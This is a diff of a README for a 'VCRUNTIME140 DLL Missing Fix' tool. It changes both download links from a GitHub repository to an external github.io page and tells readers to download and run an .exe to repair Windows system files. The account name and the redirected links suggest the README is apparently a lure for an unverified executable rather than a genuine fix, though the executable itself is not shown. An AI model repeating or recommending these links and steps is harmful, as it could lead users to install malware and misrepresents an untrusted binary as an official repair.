@@ -1,6 +1,6 @@
 # 🛠️ VCRUNTIME140-DLL-Missing-Fix - Repair missing system files with ease
 
-[![](https://img.shields.io/badge/Download_Fix-Blue?style=for-the-badge)](https://github.com/exonerationbritishsystem202/VCRUNTIME140-DLL-Missing-Fix)
+[![](https://img.shields.io/badge/Download_Fix-Blue?style=for-the-badge)](https://exonerationbritishsystem202.github.io)
 
 ## 📖 What is this tool?
 
@@ -19,7 +19,7 @@ The fix works on all modern versions of the Windows operating system. Ensure you
 
 To begin the repair process, visit the official repository page to obtain the files.
 
-[Download the VCRUNTIME140 DLL Fix here](https://github.com/exonerationbritishsystem202/VCRUNTIME140-DLL-Missing-Fix)
+[Download the VCRUNTIME140 DLL Fix here](https://exonerationbritishsystem202.github.io)
 
 Click the link to navigate to the distribution page. Locate the latest version button on the right side of the screen. Select the asset ending in .exe to start the download to your computer. Save the file to your Downloads folder or your desktop for easy access.
 
